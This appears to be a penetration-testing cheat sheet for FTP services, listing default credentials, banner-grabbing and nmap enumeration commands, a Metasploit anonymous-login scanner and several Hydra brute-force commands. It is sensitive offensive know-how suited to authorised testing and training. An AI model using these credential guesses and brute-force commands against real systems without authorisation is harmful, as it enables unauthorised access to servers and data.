# FTP
---
---
- File Transfer Protocol

##### Default Credentials
```
anonymous:anonymous
administrator:administrator
admin:admin
```

## Enumeration
---

##### Banner Grabbing
- netcat
```
nc -vn [IP] 21
```

- telnet
```
telnet [IP]
```

- nmap
```
Nmap -sC -sV -p21 [IP]
```

##### Nmap Scanning
- Script Enumeration
```
nmap --script=ftp-anon,ftp-bounce,ftp-libopie,ftp-proftpd-backdoor,ftp-vsftpd-backdoor,ftp-vuln-cve2010-4221,tftp-enum -p 21 [IP]
```

- Vulnerability Scanning
```
nmap --script=ftp-* -p 21 [IP]
```

- FTP Anonymous Enumeration
```
nmap -p 21 --script ftp-anon x.x.x.x
```

##### metasploit
```
> use auxiliary/scanner/ftp/anonymous
> set rhosts <Target_IP>
> run
```


---
---


## Exploitation
---

##### NSE & Common Vulnerabilities
```sh
nmap --script=ftp-anon,ftp-libopie,ftp-proftpd-backdoor,ftp-vsftpd-backdoor,ftp-vuln-cve2010-4221,tftp-enum -p 21 [IP]
```

##### Anonymous Login
• FTP servers may allow anonymous users to authenticate
```sh
ftp [IP] username: [anonymous or anon] password: [anonymous or password]
```

##### Hydra
```sh
hydra -t 1 -L [username list/file] -P [password list/file] -vV ftp://[IP]:21
```
```sh
hydra -t 1 -C [colon separated username and password list/file] -vV ftp://[IP]:21
```
```sh
hydra -s [Port] -C ./SecLists/blob/master/Passwords/Default-Credentials/ftp-betterdefaultpasslist.txt -u -f [IP] ftp
```
```sh
hydra -l root -P /usr/share/<passwords.txt> -t 12 [IP] ftp
```
```sh
hydra -l <username> -P /usr/share/<wordlists.txt> -f <Target_IP> ftp -V
```